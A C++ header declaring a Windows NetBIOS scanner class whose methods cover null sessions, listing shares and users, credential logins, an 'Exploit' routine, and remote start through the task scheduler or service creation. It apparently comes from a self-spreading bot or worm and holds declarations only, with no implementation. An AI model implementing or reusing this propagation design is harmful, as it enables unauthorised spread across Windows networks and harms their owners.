
#ifndef __NBSCANNER_H__
#define __NBSCANNER_H__

#include "cstring.h"
#include "scanner.h"

#ifdef WIN32
typedef struct shareinfo_s
{	CString sName;
	CString sRemark; } shareinfo;

typedef struct userinfo_s
{	CString sName;
	CString sServer; } userinfo;

class CScannerNetBios : public CScannerBase
{
public:
	CScannerNetBios();
	virtual ~CScannerNetBios() throw() { }
	virtual void StartScan(const CString &sHost);
	virtual bool TestHost(const CString &sHost) { return true; }
protected:
	NET_API_STATUS m_NetApiStatus;
	USE_INFO_2 m_UseInfo;
	USER_INFO_1 *m_UserInfo;
	SHARE_INFO_1* m_ShareInfo;

	WCHAR m_wszHost[MAX_PATH];
	WCHAR m_wszServer[MAX_PATH];
	WCHAR m_wszResource[MAX_PATH];

	bool m_bGotShares;
	bool m_bGotUsers;

	list<userinfo*> m_lUsers;
	list<shareinfo*> m_lShares;

	bool NullSession();
	bool CloseSession();
	bool GetShares(list<shareinfo*> *lpShares);
	bool GetUsers(list<userinfo*> *lpUsers);
	bool AuthSession(const char *user, const char *password);
	bool Exploit(const char *share, const char *host, const char *user, const char *password);
	bool StartViaNetScheduleJobAdd(const char *share, const char *host, const char *user, const char *password);
	bool StartViaCreateService(const char *share, const char *host, const char *user, const char *password);
//	bool StartViaPSExec(const CString &sReplyTo, const char *share, const char *host, const char *user, const char *password);
};
#endif // WIN32

#endif // __NBSCANNER_H__
